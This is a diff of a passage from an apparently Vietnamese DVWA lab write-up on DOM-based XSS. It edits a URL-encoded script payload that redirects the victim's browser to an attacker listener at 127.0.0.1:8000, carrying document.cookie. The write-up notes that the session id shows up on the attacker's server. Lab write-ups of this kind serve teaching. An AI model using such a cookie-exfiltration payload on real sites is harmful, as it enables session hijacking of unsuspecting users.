@@ -23,7 +23,7 @@ Payload gốc:
 
 Encode payload:
 ```
-%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A8000%2F%3Fcookie%3D%27%20%2B%20document.cookie%3C%2Fscript%3E
+127.0.0.1%2Fdvwa%2Fvulnerabilities%2Fxss_d%2F%3Fdefault%3DEnglish%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A8000%2F%3Fcookie%27%20%2B%20document.cookie%3C%2Fscript%3E
 ```
 3. Kết quả
 Session id của người dùng hiện trong cửa sổ server của attacker
